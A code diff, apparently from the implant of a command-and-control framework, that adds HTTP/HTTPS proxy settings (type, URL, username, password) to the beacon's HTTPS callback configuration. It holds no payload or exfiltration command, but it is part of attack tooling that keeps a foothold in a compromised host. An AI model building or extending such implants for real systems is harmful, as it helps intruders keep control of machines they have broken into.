@@ -18,6 +18,10 @@ import (
 var (
 	Targetip   string
 	Targetport string
+	HTTPProxyType      string = "none"
+	HTTPProxyURL       string = ""
+	HTTPProxyUsername string = ""
+	HTTProxyPassword  string = ""
 )
 
 func beaconHttps() {
@@ -25,6 +29,12 @@ func beaconHttps() {
 
     profiles.Config.Domain = Targetip
     profiles.Config.Port = Targetport
+	if HTTPProxyType == "http" || HTTPProxyType == "https" {
+		profiles.Config.HTTPProxyType = HTTPProxyType
+		profiles.Config.HTTPProxyUrl = HTTPProxyURL
+		profiles.Config.HTTPProxyUsername = HTTPProxyUsername
+		profiles.Config.HTTPProxyPassword = HTTProxyPassword
+	}
 	// In this case the peer of the beacon is the server
 	hp, _ := peers.NewHTTPSPeer(profiles.Config)
 	utils.ParentPeer = hp
